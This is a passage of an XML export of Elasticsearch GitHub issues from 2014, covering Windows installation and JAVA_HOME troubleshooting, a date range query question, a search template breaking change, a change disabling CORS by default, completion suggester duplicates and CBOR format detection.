</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ElasticSearch 1.3.2 Server Will not Run Under Windows 8.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7649</link><project id="" key="" /><description>I installed ElasticSearch 1.3.2 on my Windows 8.1 laptop (64 bit) and got the server to run under the Windows prompt.  When I attempt to perform basic Puts/Gets, I receive a 404 error that the server is not recognized (status 0).  I use localhost:9200 and followed the tutorial documentation with no success.  I also tried to run service install and service start and I obtain a failed error message.  I setup JAVA_HOME as required under the Java JRE1.8.20 directory.  Any suggestions on how to get the server to respond?  I am new to ElasticSearch ... thanks in advance ...
</description><key id="42239658">7649</key><summary>ElasticSearch 1.3.2 Server Will not Run Under Windows 8.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/gmarz/following{/other_user}', u'events_url': u'https://api.github.com/users/gmarz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/gmarz/orgs', u'url': u'https://api.github.com/users/gmarz', u'gists_url': u'https://api.github.com/users/gmarz/gists{/gist_id}', u'html_url': u'https://github.com/gmarz', u'subscriptions_url': u'https://api.github.com/users/gmarz/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/1594777?v=4', u'repos_url': u'https://api.github.com/users/gmarz/repos', u'received_events_url': u'https://api.github.com/users/gmarz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/gmarz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'gmarz', u'type': u'User', u'id': 1594777, u'followers_url': u'https://api.github.com/users/gmarz/followers'}</assignee><reporter username="">jburman789</reporter><labels /><created>2014-09-08T20:26:56Z</created><updated>2014-10-10T08:51:54Z</updated><resolved>2014-10-10T08:51:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="gmarz" created="2014-09-08T21:04:42Z" id="54887062">Hi @jburman789,

Mind sharing the console output after starting elasticsearch?  Also, what's the error message you're receiving when trying to install as a service?
</comment><comment author="jburman789" created="2014-09-08T21:11:56Z" id="54888049">Hi,

Thanks for the reply ... no, I do not mind sharing my console (Lync 2013?) ... the error message I receive after trying to install a service is: service install (or start) I receive the message 'Failed starting 'elasticsearch-service-x64' service (start) or Failed installing 'elasticsearch-service-x64' service (install) ... please advise
</comment><comment author="jburman789" created="2014-09-11T17:28:43Z" id="55298557">I loaded the latest version of Java (jre1.8.0_20) and attempted to run 'service' under ElasticSearch 1.3.2 and it failed both on service install and service start for Windows 8.1 and x64.  The ES server appears to run under the Windows prompt, but fails to respond to the REST API clients (both Chrome and Mozilla)?  I get a status 0 error under Sense ... I tried to check for documentation and found nothing regarding these problems.
</comment><comment author="gmarz" created="2014-09-24T17:50:43Z" id="56710876">Hey @jburman789,

Sorry for the delay here, this slipped passed me.

Can you copy and paste the error message you're receiving when executing `bin/service.bat install` and `bin/service.bat start`?

Also, are you running any firewall software that could potentially be blocking ports 9200-9300?
</comment><comment author="jburman789" created="2014-09-26T17:46:14Z" id="56995617">Thanks for the reply ... no, I do not mind sharing my console (Lync 2013?) ... the error message I receive after trying to install a service is: service install (or start) I receive the message 'Failed starting 'elasticsearch-service-x64' service (start) or Failed installing 'elasticsearch-service-x64' service (install) ... please advise &#8230; thanks, Jerry Burman

From: Greg Marzouka [mailto:notifications@github.com]
Sent: Wednesday, September 24, 2014 10:51 AM
To: elasticsearch/elasticsearch
Cc: Burman, Jerry (US - Los Angeles)
Subject: Re: [elasticsearch] ElasticSearch 1.3.2 Server Will not Run Under Windows 8.1 (#7649)

Hey @jburman789https://github.com/jburman789,

Sorry for the delay here, this slipped passed me.

Can you copy and paste the error message you're receiving when executing bin/service.bat install and bin/service.bat start?

Also, are you running any firewall software that could potentially be blocking ports 9200-9300?

&#8212;
Reply to this email directly or view it on GitHubhttps://github.com/elasticsearch/elasticsearch/issues/7649#issuecomment-56710876.

This message (including any attachments) contains confidential information intended for a specific individual and purpose, and is protected by law. If you are not the intended recipient, you should delete this message and any disclosure, copying, or distribution of this message, or the taking of any action based on it, by you is strictly prohibited.

v.E.1
</comment><comment author="jburman789" created="2014-09-26T17:48:29Z" id="56995925">Thanks for the reply ... the error message I receive after trying to install a service is: service install (or start) I receive the message 'Failed starting 'elasticsearch-service-x64' service (start) or Failed installing 'elasticsearch-service-x64' service (install) ... please advise
</comment><comment author="jburman789" created="2014-09-26T17:55:05Z" id="56996821"> I checked netstat and it looks like port 9200 is listening ...
</comment><comment author="gmarz" created="2014-09-26T20:00:27Z" id="57012758">@jburman789 can you ensure that you've set your JAVA_HOME environment variable correctly?  Here are some instructions on how to do that: http://stackoverflow.com/questions/2619584/how-to-set-java-home-on-windows-7
</comment><comment author="jburman789" created="2014-09-26T21:12:12Z" id="57021111">Hi Greg,

Yes, I have checked my JAVA_HOME setting and it is correctly pointing to my current jre1.8.0_20 directory in c:\program files\java\jre1.820_20.

Please advise, thanks, Jerry B.

From: Greg Marzouka [mailto:notifications@github.com]
Sent: Friday, September 26, 2014 1:01 PM
To: elasticsearch/elasticsearch
Cc: Burman, Jerry (US - Los Angeles)
Subject: Re: [elasticsearch] ElasticSearch 1.3.2 Server Will not Run Under Windows 8.1 (#7649)

@jburman789https://github.com/jburman789 can you ensure that you've set your JAVA_HOME environment variable correctly? Here are some instructions on how to do that: http://stackoverflow.com/questions/2619584/how-to-set-java-home-on-windows-7

&#8212;
Reply to this email directly or view it on GitHubhttps://github.com/elasticsearch/elasticsearch/issues/7649#issuecomment-57012758.

This message (including any attachments) contains confidential information intended for a specific individual and purpose, and is protected by law. If you are not the intended recipient, you should delete this message and any disclosure, copying, or distribution of this message, or the taking of any action based on it, by you is strictly prohibited.

v.E.1
</comment><comment author="gmarz" created="2014-09-30T20:11:25Z" id="57374823">@jburman789 Can you make sure that the service isn't already installed, and you're just not aware?  I know that sounds obvious, but just want to eliminate the possibility.  Trying to install the service when it already exists will produce that error.
</comment><comment author="jburman789" created="2014-09-30T20:36:40Z" id="57378529">Hi Greg,

When I attempt to do a service install or service start I get the error messages shown below in the Windows prompt.  When I look at the Task Manager (left), I see that the ES service is stopped.  When I
try to restart the ES service in the Task Manager, it flips back to stopped every time.

Please advise, thanks, Jerry Burman

[cid:image003.jpg@01CFDCB3.6AB42000]

From: Greg Marzouka [mailto:notifications@github.com]
Sent: Tuesday, September 30, 2014 1:12 PM
To: elasticsearch/elasticsearch
Cc: Burman, Jerry (US - Los Angeles)
Subject: Re: [elasticsearch] ElasticSearch 1.3.2 Server Will not Run Under Windows 8.1 (#7649)

@jburman789https://github.com/jburman789 Can you make sure that the service isn't already installed, and you're just not aware? I know that sounds obvious, but just want to eliminate the possibility. Trying to install the service when it already exists will produce that error.

&#8212;
Reply to this email directly or view it on GitHubhttps://github.com/elasticsearch/elasticsearch/issues/7649#issuecomment-57374823.
</comment><comment author="gmarz" created="2014-09-30T20:44:48Z" id="57379710">@jburman789 Ah, okay so the service is installed- that's not the issue.  The issue is that it's crashing when you try to start it.  What happens if you just run bin/elasticsearch.bat instead of starting the service?  Does it crash or does it look like it starts up successfully?  Can you share the output?
</comment><comment author="jburman789" created="2014-09-30T21:00:02Z" id="57381925">Ok, the elasticsearch.bat does start &#8230; but the service is still stopped under the Task Manager and will not start as if flips back to stopped when a start is attempted &#8230; however, as you see below, the Windows firewall has blocked some Java operations?  How do I let Java operate normally?

Thanks, Jerry Burman
[cid:image003.jpg@01CFDCB6.C4BFB390]

From: Greg Marzouka [mailto:notifications@github.com]
Sent: Tuesday, September 30, 2014 1:45 PM
To: elasticsearch/elasticsearch
Cc: Burman, Jerry (US - Los Angeles)
Subject: Re: [elasticsearch] ElasticSearch 1.3.2 Server Will not Run Under Windows 8.1 (#7649)

@jburman789https://github.com/jburman789 Ah, okay so the service is installed- that's not the issue. The issue is that it's crashing when you try to start it. What happens if you just run bin/elasticsearch.bat instead of starting the service? Does it crash or does it look like it starts up successfully? Can you share the output?

&#8212;
Reply to this email directly or view it on GitHubhttps://github.com/elasticsearch/elasticsearch/issues/7649#issuecomment-57379710.

This message (including any attachments) contains confidential information intended for a specific individual and purpose, and is protected by law. If you are not the intended recipient, you should delete this message and any disclosure, copying, or distribution of this message, or the taking of any action based on it, by you is strictly prohibited.

v.E.1
</comment><comment author="gmarz" created="2014-09-30T21:12:24Z" id="57383719">@jburman789 Looks like you're replying via e-mail and I'm not able to see what you're trying to paste.  Can you log on to the GitHub site and reply again?
</comment><comment author="jburman789" created="2014-09-30T21:15:52Z" id="57384200">![screenshot](https://cloud.githubusercontent.com/assets/8700818/4466652/e70caaba-48e6-11e4-9553-7624d6706af6.jpg)
 Can you see this image of my desktop?
</comment><comment author="gmarz" created="2014-09-30T21:39:16Z" id="57387368">Yea, I can see it now.  Well, Java being blocked is definitely a problem :).

Try going to Control Panel -&gt; System and Security -&gt; Windows Firewall and click "Allow an app or feature through Windows Firewall" on the left-hand side.

Look for "Java(TM) Platform SE Binary" and make sure it's checked off.  Also click "Details..." and make sure it's pointing to the same path you set JAVA_HOME to.

I'm running Win 8.1, so my steps might be a little different than yours.
</comment><comment author="jburman789" created="2014-09-30T21:55:11Z" id="57389422">Ok, the Java(TM) Platform SE Binary is checked off and the details point to JAVA_HOME ... when I look back at services in the Task Manager, ElasticSearch is still stopped and will not start ... ?
</comment><comment author="JonnyD" created="2014-10-03T02:18:20Z" id="57740801">Having the same problem but getting this error when I run elasticsearch.bat:

C:\Users\User\Documents\elasticsearch-1.3.4\bin&gt;elasticsearch.bat
Exception in thread "main" java.lang.UnsupportedClassVersionError: org/elasticse
arch/bootstrap/Elasticsearch : Unsupported major.minor version 51.0
        at java.lang.ClassLoader.defineClass1(Native Method)
        at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
        at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
        at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:14
1)
        at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
        at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
        at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
Could not find the main class: org.elasticsearch.bootstrap.Elasticsearch.  Progr
am will exit.
</comment><comment author="jburman789" created="2014-10-03T02:24:34Z" id="57741126">Looks like something else is going on in your setup.  ES.bat appears to run under the Windows prompt, but fails to work in the API.
</comment><comment author="s1monw" created="2014-10-03T05:01:59Z" id="57751776">@JonnyD you have to run it with Java7 or higher. It seems ilke your java version is not compatible with the class files generated. Java7 is the minimum requirement.

simon
</comment><comment author="jburman789" created="2014-10-03T16:03:02Z" id="57816352">Simon, I installed Java 7 on my Win 8.1 laptop and I finally got the RESTClient under Mozilla to respond to the server.  However, under Chrome, the RESTClient does not work in that I get a server error?
</comment><comment author="samarthsikotara" created="2014-10-10T07:56:16Z" id="58623680">I use Elasticsearch-1.4.0 Beta1 version with java 7 on windows 7 32 bit. when I run elasticsearch.bat. I get below same error: 

Exception in thread "main" java.lang.UnsupportedClassVersionError: org/elasticsearch/bootstrap/Elasticsearch : Unsupport
ed major.minor version 51.0
        at java.lang.ClassLoader.defineClass1(Native Method)
        at java.lang.ClassLoader.defineClass(ClassLoader.java:620)
        at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:124)
        at java.net.URLClassLoader.defineClass(URLClassLoader.java:260)
        at java.net.URLClassLoader.access$000(URLClassLoader.java:56)
        at java.net.URLClassLoader$1.run(URLClassLoader.java:195)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:188)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:276)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:251)
        at java.lang.ClassLoader.loadClassInternal(ClassLoader.java:319)

How can I fix this issue?
</comment><comment author="dakrone" created="2014-10-10T08:13:45Z" id="58625272">@samarthsikotara even though you have installed Java 7 on the windows machine, it is not being picked up by the `elasticsearch.bat` script. You need to make sure you correctly set the `JAVA_HOME` environment variable so the correct version of Java is located.
</comment><comment author="samarthsikotara" created="2014-10-10T08:23:54Z" id="58626272">I have already set the JAVA_HOME environment variable. see below image. you'll get to know.

![es 1 4 0](https://cloud.githubusercontent.com/assets/3746448/4589657/960eccc0-5056-11e4-8520-acd42821551f.png)
</comment><comment author="dakrone" created="2014-10-10T08:28:24Z" id="58626666">@samarthsikotara since the path has a space, you should use the shortened form for the directory name: `Progra~1`
</comment><comment author="samarthsikotara" created="2014-10-10T08:45:04Z" id="58628245">@dakrone yes I changed the path but still getting the same problem. :( 
![es 1 4 0](https://cloud.githubusercontent.com/assets/3746448/4589882/ae742ac8-5059-11e4-98e5-5eeac8d071df.png)
</comment><comment author="dakrone" created="2014-10-10T08:47:41Z" id="58628508">@samarthsikotara have you closed and re-opened any command windows since you made this change? Even applying the settings will only take effect for newly opened command windows.

You could also try rebooting, to ensure that it is taking effect.

Alternatively, you could remove the earlier JVM that is installed, to prevent it from being used.
</comment><comment author="samarthsikotara" created="2014-10-10T08:51:18Z" id="58628949">@dakrone Thanks It is working fine. :+1:  :) 
</comment><comment author="dakrone" created="2014-10-10T08:51:54Z" id="58629009">Glad to hear that, going to close this issue
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>What is the correct way to use range on dates?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7648</link><project id="" key="" /><description>I have this configuration:

  if [type] == "iis" {
    grok {
      #type,timeLogged,timeQueued,orig,rcpt,orcpt,dsnAction,dsnStatus,dsnDiag,dsnMta,bounceCat,srcType,srcMta,dlvType,dlvSourceIp,dlvDestinationIp,dlvEsmtpAvailable,dlvSize,vmta,jobId,envId,queue,vmtaPool,header_X-MsgID,header_X-UmailPersonalization
      match =&gt; { "message" =&gt; "%{TIMESTAMP_ISO8601:original} %{DATA:sitename} %{IP:sip} %{NOTSPACE:method} %{NOTSPACE:uristem} %{NOTSPACE:uriquery} %{NUMBER:port} %{NOTSPACE:username} %{IP:cip} %{NOTSPACE:useragent} %{NOTSPACE:referer} %{NUMBER:status} %{NUMBER:substatus} %{NUMBER:win32status} %{NUMBER:scbytes} %{NUMBER:csbytes} %{NUMBER:timetaken}" }
      #overwrite =&gt; ["message"]
    }
  }
  date {
    match =&gt; [ "original",  "yyyy-MM-dd HH:mm:ssZ", "yyyy-MM-dd HH:mm:ss,SSS", "yyyy-MM-dd HH:mm:ss", "ISO8601" ]
    target =&gt; "@timestamp"
    timezone =&gt; "America/Sao_Paulo"
    #remove_field =&gt; "original_timestamp"
  }

And i'm trying to do a query like:

{
    "query" : {
        "filtered" : {
            "filter" : {
                "range" : {
                    "timestamp" : {
                        "gt" : "2014-01-01 00:00:00"
                    }
                }
            }
        }
    }
}

I would like to know why this is not working. What is wrong?

Here is an example of a line that is indexed:

{
      "_index" : "logstash-2014.09.08",
      "_type" : "iis",
      "_id" : "wBsj_AETS5C7FOO9XPMhAg",
      "_score" : 1.0,
      "_source":{"message":"2014-09-08 14:00:58 W3SVC1 177.53.210.1 GET /tm/t.aspx p=58239088&amp;c=NjAyNzgw&amp;e=xpto@blabla.com&amp;l=MDE=&amp;up=765128514&amp;u=aHR0cDovL2kudW1haWwuY29tLmJyL3RyYWNraW5nL3BpeGVsLmdpZg== 80 - 177.53.211.245 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/37.0.2062.103+Safari/537.36 - 302 0 0 1082 403 0\r","@version":"1","@timestamp":"2014-09-08T17:00:58.000Z","type":"iis","host":"BSPOWKS67","path":"D:\weee\logs\Vrum\u_ex14090814.log","original":"2014-09-08 14:00:58","sitename":"W3SVC1","sip":"177.53.210.1","method":"GET","uristem":"/tm/t.aspx","uriquery":"p=58239088&amp;c=NjAyNzgw&amp;e=xpto@blabla.com&amp;l=MDE=&amp;up=765128514&amp;u=aHR0cDovL2kudW1haWwuY29tLmJyL3RyYWNraW5nL3BpeGVsLmdpZg==","port":"80","username":"-","cip":"177.53.211.245","useragent":"Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/37.0.2062.103+Safari/537.36","referer":"-","status":"302","substatus":"0","win32status":"0","scbytes":"1082","csbytes":"403","timetaken":"0"}
    }
</description><key id="42239379">7648</key><summary>What is the correct way to use range on dates?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">daviddelucca</reporter><labels /><created>2014-09-08T20:24:19Z</created><updated>2014-09-09T12:49:04Z</updated><resolved>2014-09-09T12:49:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-09T12:49:04Z" id="54963568">Hi @padcoe 

Please ask questions like this in the user forums. This issues list is for bugs and feature requests.  Hint: your field is called `@timestamp`, not `timestamp`
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Breaking change not documented in release notes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7647</link><project id="" key="" /><description>Somewhere between v1.2.2 and v1.3.1 (I suspect 1.3.0), the DSL for _search/template changed such that, for a template that is deployed to the scripts directory in the file system has to be specified by:

{
    "params": {...},
    "template": {
        "file": "simple"
    }
}

instead of 

{
    "params": {...},
    "template": "simple"
}'

This is a breaking change in either direction (neither form works for both versions).

This is not identified in the release notes on the downloads page.
</description><key id="42235125">7647</key><summary>Breaking change not documented in release notes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">GlenRSmith</reporter><labels /><created>2014-09-08T19:41:43Z</created><updated>2014-09-19T11:15:43Z</updated><resolved>2014-09-19T11:15:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Update object-type.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7646</link><project id="" key="" /><description>Made the object definition more explicit. 
</description><key id="42230665">7646</key><summary>Update object-type.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">thinklarge</reporter><labels><label>docs</label></labels><created>2014-09-08T18:57:27Z</created><updated>2014-10-14T11:17:14Z</updated><resolved>2014-10-14T11:17:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-09T12:44:34Z" id="54963091">Hi @BargLenis 

Thanks for the PR. Please could I ask you to sign the CLA so that I can merge this in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-10-14T11:15:58Z" id="59026931">CLA not signed. Treating as bug report.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TESTS]: create directory for heapdumps if not exists</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7645</link><project id="" key="" /><description>Before the heapdump was either written in a file with the
directory name if the heapdump path ended without / or
not written at all if the path ended with /
</description><key id="42222512">7645</key><summary>[TESTS]: create directory for heapdumps if not exists</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels /><created>2014-09-08T17:41:04Z</created><updated>2014-09-08T19:22:09Z</updated><resolved>2014-09-08T19:22:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mrsolo" created="2014-09-08T19:04:26Z" id="54870482">LGTM

tested 
a) with or without trailing /
b) directory exists prior or doesn't
</comment><comment author="s1monw" created="2014-09-08T19:08:43Z" id="54871108">LGTM too
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indices API returns wrong search stats groups in ES 1.3</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7644</link><project id="" key="" /><description>Hi, 

We encountered a problem with the search stats groups in Indices API. 

The query_count for stats groups is false at shards level. It make fine query monitoring at shards/nodes level impossible.

I have created a curl recreation. It has been tested with ES 1.3.2 on my recent MBP.

https://gist.github.com/belevian/46026b88500d264fbc66

Thanks in advance to fix this problem.

Do not hesitate to ask if you need more informations.

Regards

Benjamin
</description><key id="42218279">7644</key><summary>Indices API returns wrong search stats groups in ES 1.3</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/alexksikes/following{/other_user}', u'events_url': u'https://api.github.com/users/alexksikes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/alexksikes/orgs', u'url': u'https://api.github.com/users/alexksikes', u'gists_url': u'https://api.github.com/users/alexksikes/gists{/gist_id}', u'html_url': u'https://github.com/alexksikes', u'subscriptions_url': u'https://api.github.com/users/alexksikes/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/43475?v=4', u'repos_url': u'https://api.github.com/users/alexksikes/repos', u'received_events_url': u'https://api.github.com/users/alexksikes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/alexksikes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'alexksikes', u'type': u'User', u'id': 43475, u'followers_url': u'https://api.github.com/users/alexksikes/followers'}</assignee><reporter username="">belevian</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-09-08T16:55:08Z</created><updated>2014-12-16T14:00:05Z</updated><resolved>2014-12-16T14:00:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Unify search context cleanup</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7643</link><project id="" key="" /><description>Today there are two different ways to cleanup search contexts which can
potentially lead to double releasing of a context. This commit unifies
the methods and prevents double closing.

Closes #7625
</description><key id="42201881">7643</key><summary>Unify search context cleanup</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-08T14:29:07Z</created><updated>2015-06-07T18:47:50Z</updated><resolved>2014-09-08T18:43:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-08T14:53:01Z" id="54831333">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Security: Disable CORS by default</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7642</link><project id="" key="" /><description>In order to deliver a more secure out-of-the-box configuration this commit
disables cross-origin resource sharing by default. It is possibly to enable it and create a more finegrained configuration anytime using the existing cors configuration parameters.

Closes #7151
</description><key id="42199773">7642</key><summary>Security: Disable CORS by default</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Settings</label><label>enhancement</label><label>release highlight</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-08T14:09:43Z</created><updated>2015-06-07T12:41:11Z</updated><resolved>2014-09-09T09:22:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-08T14:58:24Z" id="54832164">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Duplicate results with completion suggester</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7641</link><project id="" key="" /><description>Given the following document

`{
 ...
 "input" : ["foobar", "barfoo", "foo"]
 ...
}`

and the query `foo`, the document will show up twice in the result set when using completion suggester. I'm currently using a custom method to clean my input data to make sure the same prefix is not being used twice for a given document but it somehow feels wrong. With a regular search a document will also not show multiple times if a keyword is contained more than once in the document, is the completion suggester working this way by design?
</description><key id="42198626">7641</key><summary>Duplicate results with completion suggester</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">petard</reporter><labels /><created>2014-09-08T13:58:05Z</created><updated>2014-12-11T20:37:44Z</updated><resolved>2014-12-11T20:37:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-08T14:04:17Z" id="54821939">Hi @petard 

It is by design.  You can use the `output` to reduce all of those inputs to a single suggestion.  See http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-suggesters-completion.html#indexing
</comment><comment author="clintongormley" created="2014-09-08T14:04:41Z" id="54821998">@areek not sure if you have any further comment, otherwise go ahead and close
</comment><comment author="petard" created="2014-09-08T15:02:12Z" id="54833046">Thanks @clintongormley, I think i have some kind of catch 22 going on. I'm making every output unique by adding a random number (see #4255) as i have different documents that are the same output-wise but have different payloads. So i guess i'm stuck until the deduplication on output becomes optional with different payloads.
</comment><comment author="areek" created="2014-09-08T15:22:14Z" id="54836608">@clintongormley @petard, optional deduplication will not be supported with the current completion suggester implementation. Though, the optional deduplication support and many other enhancements are planned/implemented for a new suggester implementation (see https://github.com/elasticsearch/elasticsearch/pull/7353 for first iteration of the suggester implementation), though it is to be noted that the support for this suggester is not yet in ES.
</comment><comment author="areek" created="2014-12-11T20:37:44Z" id="66684454">closing in favour of https://github.com/elasticsearch/elasticsearch/issues/8909
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>CBOR: Improve recognition of CBOR data format</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7640</link><project id="" key="" /><description>Currently we only check if the first byte of the body is a `BYTE_OBJECT_INDEFINITE` to determine whether the content is CBOR or not.  However, what we should actually do is to check whether the "major type" is an object.

See:
- https://github.com/FasterXML/jackson-dataformat-cbor/blob/master/src/main/java/com/fasterxml/jackson/dataformat/cbor/CBORParser.java#L614
- https://github.com/FasterXML/jackson-dataformat-cbor/blob/master/src/main/java/com/fasterxml/jackson/dataformat/cbor/CBORParser.java#L682

Also, CBOR can be prefixed with a self-identifying tag, `0xd9d9f7`,  which we should check for as well.  Currently Jackson doesn't recognise this tag, but it looks like that will change in the future: https://github.com/FasterXML/jackson-dataformat-cbor/issues/6
